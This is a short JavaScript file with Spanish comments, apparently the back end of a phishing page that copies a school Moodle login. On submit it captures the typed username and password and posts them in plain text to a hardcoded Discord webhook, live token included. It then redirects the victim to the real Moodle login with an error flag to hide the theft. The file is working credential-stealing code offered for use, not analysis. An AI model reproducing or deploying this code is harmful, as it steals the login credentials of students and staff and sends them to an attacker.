document.addEventListener('DOMContentLoaded', function() {
    const form = document.getElementById('login');
    form.addEventListener('submit', function(event) {
        event.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        // Construye el objeto con los datos del usuario
        const userData = {
            username: username,
            password: password
        };
        // Envía los datos al webhook de Discord
        enviarDatosDiscord(userData);
        // Aquí puedes agregar más lógica, como redirigir a otra página
    });

    function enviarDatosDiscord(data) {
        // URL del webhook de Discord
        const webhookURL = 'https://discord.com/api/webhooks/1227536146230415453/u7a_u18UKBa8D4cOF2eI0XY8ftTyc_Kpn0Ea1Ew-gmqTXGQCLDMgWmpOCoxK2HQtUSLR';
        // Datos a enviar al webhook
        const payload = {
            content: `Usuario: ${data.username}, Contraseña: ${data.password}`
        };
        // Realiza la petición POST al webhook de Discord
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Error al enviar los datos al webhook de Discord');
            }
            console.log('Datos enviados exitosamente al webhook de Discord');
            // Redirige al usuario a la página de Moodle con un mensaje de error
            window.location.href = 'https://elearning6.hezkuntza.net/012982/login/index.php?loginerror=1';
        })
        .catch(error => {
            console.error('Error:', error);
        });
    }
});
